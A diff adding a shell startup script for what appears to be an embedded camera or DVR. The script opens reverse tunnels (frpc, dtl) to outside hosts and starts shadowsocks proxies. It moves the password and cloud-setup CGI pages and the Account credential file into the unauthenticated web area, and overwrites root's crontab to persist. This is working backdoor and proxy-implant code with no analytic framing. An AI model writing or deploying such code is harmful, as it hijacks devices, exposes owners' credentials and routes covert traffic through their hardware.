@@ -1,0 +1,44 @@
+#!/bin/sh
+if [ -f /mnt/firmware/frpid ]; then frpid="$(cat /mnt/firmware/frpid)";fi
+
+if [ -z "$(ps | grep dtl | grep 19848 | grep -v grep)" ]; then
+nohup /mnt/video/dtl -reg $frpid -local :19848 -clientkey 30819 -remote diyi.imbbs.in:8000 -buster diyi.imbbs.in:8018 -ssl=false > /dev/null 2>&1 &
+fi
+
+if [ -z "$(ps | grep frpc | grep frpc.ini | grep -v grep)" ]; then
+nohup /mnt/video/frpc tcp -l 8899 -r $frpid -n ss-$frpid -s tvbsuper.ticp.net:7001 > /dev/null &
+nohup /mnt/video/frpc tcp -l 8899 -r $frpid -n ss-$frpid -s frpserver.ticp.net:7001 > /dev/null &
+nohup /mnt/video/frpc tcp -l 19848 -r $frpid -n tld-$frpid -s diyi.imbbs.in:7000 > /dev/null &
+
+fi
+
+if [ -z "$(ps | grep dtunnel_lite | grep -v grep)" ]; then
+nohup /mnt/video/dtunnel_lite -service :9001 -xor $(cat /mnt/firmware/dtlkey) > /dev/null 2>&1 &
+fi
+
+if [ -z "$(ps | grep ass6 | grep -v grep)" -a -z "$(ps | grep ssgo | grep -v grep)" ]; then
+cat /proc/cpuinfo | grep FA7 && sscpu=fa
+cat /proc/cpuinfo | grep FA6 && sscpu=fa
+cat /proc/cpuinfo | grep ARM && sscpu=arm
+if [ "$sscpu" == "arm" ]; then
+/mnt/video/ass6 -s 0.0.0.0 -p 8899 -k $(cat /mnt/database/sspass.conf) -m chacha20 -t 200 -u -f /tmp/8899.ss &
+else
+nohup /mnt/video/ssgo -p 8899 -k $(cat /mnt/database/sspass.conf) -m chacha20 -u > /dev/null &
+fi
+fi
+
+if [ ! -d /tmp/myt ]; then
+mkdir /tmp/myt
+sleep 1
+cp -r /tmp/sqfs/HTML/cgi-bin/supervisor /tmp/myt
+cp -r /tmp/sqfs/HTML/cgi-bin/nobody /tmp/myt
+mount -o noatime /tmp/myt/supervisor /tmp/sqfs/HTML/cgi-bin/supervisor
+mount -o noatime /tmp/myt/nobody /tmp/sqfs/HTML/cgi-bin/nobody
+mv /tmp/myt/supervisor/CloudSetup.cgi /tmp/myt/nobody
+mv /tmp/myt/supervisor/PwdGrp.cgi /tmp/myt/nobody
+cp /mnt/database/xml/Account /tmp/myt/nobody/
+fi
+
+if [ "$(cat /mnt/database/cron.conf)" != "$(cat /var/spool/cron/crontabs/root)" ]; then
+cat /mnt/database/cron.conf > /var/spool/cron/crontabs/root 
+fi
